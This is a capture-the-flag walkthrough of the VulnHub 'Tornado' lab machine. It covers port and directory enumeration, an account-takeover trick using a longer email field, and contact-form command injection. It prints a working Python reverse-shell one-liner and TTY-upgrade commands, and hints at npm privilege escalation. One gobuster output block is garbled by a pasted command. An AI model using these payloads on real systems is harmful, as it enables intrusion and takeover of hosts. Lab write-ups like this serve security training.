# Torando 
[Room Link](https://www.vulnhub.com/entry/ia-tornado,639/)

![image](https://user-images.githubusercontent.com/5285547/121968926-21f79300-cd6b-11eb-88a2-531041557970.png)


## Enumeration

Let's start with some enum!

### Nmap
```bash
nmap -p- -v 192.168.56.122
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Gobuster

```bash
gobuster dir -u http://192.168.56.122/  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,gz,php,js,zip,img,bak -t 45
```

```bash
/index.html           (Status: 200) [Size: 10701]
/manual               (Status: 301) [Size: 317] [--> http://192.168.56.122/manual/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.56.122/javascript/]
/server-status        (Status: 403) [Size: 279]                                        
/bluesky              (Status: 301) [Size: 318] [--> http://192.168.56.122/bluesky/] 
```

bluesky? lets check it out

```bash
gobuster dir -u http://192.168.56.122/bluesky  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,gz,php,js,zip,img,bak -t 45
```

```bash
/index.html           (Status: 200) [Size: 14979]
/login.php            (Status: 200) [Size: 824]  
/contact.php          (Status: 302) [Size: 2034] [--> login.php]
/about.php            (Status: 302) [Size: 2024] [--> login.php]
/signup.php           (Status: 200) [Size: 825]                 
/css                  (Status: 301) [Size: 322] [--> http://192.168.56.122/bluesky/css/]
gobuster dir -u http://192.168.56.122/  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x /imgs                 (Status: 301) [Size: 323] [--> http://192.168.56.122/bluesky/imgs/]
/js                   (Status: 301) [Size: 321] [--> http://192.168.56.122/bluesky/js/]  
/logout.php           (Status: 302) [Size: 0] [--> login.php]                            
/dashboard.php        (Status: 302) [Size: 2024] [--> login.php]                         
/port.php             (Status: 302) [Size: 2098] [--> login.php]   
```

Nice, we have a signup.php and login.php. Looks like a good place to start.  
Lets create an account and check the web app out. 

http://192.168.56.122/bluesky/

![image](https://user-images.githubusercontent.com/5285547/121968941-2d4abe80-cd6b-11eb-9c53-2be3f22bbcc6.png)

http://192.168.56.122/bluesky/signup.php

![image](https://user-images.githubusercontent.com/5285547/121969063-700c9680-cd6b-11eb-95eb-4f10ec2fa170.png)

After registering and going to login.php we get a dashbaord interface.

![image](https://user-images.githubusercontent.com/5285547/121969202-afd37e00-cd6b-11eb-9f1c-4a4443556bc1.png)

![image](https://user-images.githubusercontent.com/5285547/121969243-c11c8a80-cd6b-11eb-8e4b-d235c460b5ff.png)

![image](https://user-images.githubusercontent.com/5285547/121969267-d2659700-cd6b-11eb-996a-eea16e5413c9.png)

![image](https://user-images.githubusercontent.com/5285547/121969288-dee9ef80-cd6b-11eb-9461-ddcb1d8576e0.png)

Ok, so the contact form is not working and not much else is present apart from the hint for LFI. After testing I could not find any LFI vulnerability.  
Checking the source code of the web pages, we see one comment out of place on the portfolio.php page. 

```html
<!-- /home/tornado/imp.txt -->
```

Now the LFI makes sense, after trying a few variations we can get the working payload as

```bash
http://192.168.56.122/~tornado/imp.txt
```

![image](https://user-images.githubusercontent.com/5285547/121969565-7bac8d00-cd6c-11eb-882b-bd3585f0d9ba.png)

Now we have a list of what looks like varified users. Lets test the accounts and see if any have higher prividledges.
Using Burp community I captured the signup.php request and sent it to intruder so i can see if i can make the account on the list.  
It seemded none had extra access we see jacob@tornado, admin@tornado, hr@tornado are already registered.  
In the requests response I noticed a 'name:-13' element. On successful signup it was 'name:-15'

![image](https://user-images.githubusercontent.com/5285547/121970450-7d775000-cd6e-11eb-91c5-4eff2081d8b9.png)

I then tried to edit the source code with dev tools (F12) field to allow more charaters in the email field.
Changing the charate limit to 20 then trying again with 'jacob@tornado a' we can make a new acocunt. After now loggin in with jacob, 
the contact form works. 

![image](https://user-images.githubusercontent.com/5285547/121970990-a815d880-cd6f-11eb-9065-c3f320f98b6e.png)

![image](https://user-images.githubusercontent.com/5285547/121971000-b06e1380-cd6f-11eb-9535-e0f15dc61742.png)

Using tcpdump we can see if we get any ping back to our machine, which we do.

```bash
sudo tcpdump -i eth1
```

![image](https://user-images.githubusercontent.com/5285547/121971233-2e321f00-cd70-11eb-983c-5540275aede0.png)

Looks like we can get a reverse connection. 

Payload
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR-IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
kill current terminal
```
Ctrl + z
```
echo raw stty then forground it
```
stty raw -echo;fg
```
select terminal
```
xterm
```
when you get the terminal back enter
```
export TERM=xterm
```

![image](https://user-images.githubusercontent.com/5285547/121971512-c3351800-cd70-11eb-8e80-f06ad6df8344.png)

Enumerating the system we quickly see our priv esc route on the machine. 

![image](https://user-images.githubusercontent.com/5285547/121972155-4acf5680-cd72-11eb-86d2-0ce04c48c006.png)

Checking out npm on GTFOBins.com 

![image](https://user-images.githubusercontent.com/5285547/121972264-8a963e00-cd72-11eb-9151-146f35039214.png)

We see we make an update file and use that to get root. 







